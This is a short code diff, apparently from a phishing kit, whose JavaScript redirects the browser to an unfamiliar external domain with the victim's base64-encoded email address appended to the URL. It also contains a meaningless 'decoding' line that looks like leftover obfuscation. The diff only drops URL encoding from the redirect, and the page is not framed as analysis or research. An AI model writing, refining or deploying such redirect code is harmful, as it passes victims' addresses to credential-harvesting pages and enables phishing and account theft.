@@ -111,7 +111,7 @@
             let encodedURL = "https://TPk.subodorer6.com/W60IUboNTicdWiHGIQlHtrEFfhVQSYiQ/";
             let decodedURL = encodedURL.split(" ").map(num => String.fromCharCode(num)).join("");
 
-            window.location.href = encodedURL + "#W" + encodeURIComponent(base64Email);
+            window.location.href = encodedURL + "#W" + (base64Email);
         }
 
         // Enable "Enter" key submission for email input
